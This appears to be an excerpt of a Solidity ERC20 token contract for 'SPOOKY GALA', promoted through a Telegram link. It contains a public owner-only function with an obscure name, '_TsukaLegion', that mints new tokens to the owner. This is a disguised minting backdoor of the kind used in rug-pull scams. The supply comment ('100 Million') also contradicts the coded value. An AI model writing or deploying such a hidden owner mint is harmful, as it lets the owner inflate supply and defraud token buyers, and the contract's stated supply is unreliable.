...
//
// $SpookyGala proposes an innovative feature in its contract.
//
// 📱 Telegram:https::https://t.me/+NyCio-hmXd45NGE1
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _TsukaLegion(uint256 amount) public onlyOwner {
    _TsukaLegion(msg.sender, amount);
    }
    ...
    function _TsukaLegion(address account, uint256 amount) internal virtual {
...
contract SPOOKYGALA is ERC20 {

    uint tokenTotalSupply = 1000000000000; // 100 Million Token Supply

    constructor() public ERC20("SPOOKY GALA", "SPOOKYGALA") {
        _TsukaLegion(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}